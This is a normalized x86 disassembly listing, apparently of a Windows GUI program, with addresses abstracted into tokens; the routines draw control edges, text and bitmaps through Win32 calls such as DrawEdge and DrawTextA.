jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41c954
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41c960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ea23
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40427c
push eax
mov eax [ ebp - 0xc ]
call sub_40447c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c694
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40427c
push eax
mov eax [ ebp - 0xc ]
call sub_40447c
push eax
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c694
mov eax 0xff00000d
call sub_41c1d4
mov esi eax
mov eax 0xff000010
call sub_41c1d4
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c694
jmp r-xdata
sub_44ea88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44f370
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41ce60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c694
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41ce60
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b624
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41ce60
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421534
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44eecf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42261c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c694
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b624
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41ce60
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423670
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce34
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d350
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44bb3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41ce60
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e838
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c960
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d158
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c694
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40326c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e838
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f377
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44d8fc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e838
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44f390
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44fc98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41ce60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c694
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41ce60
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b624
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d628
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
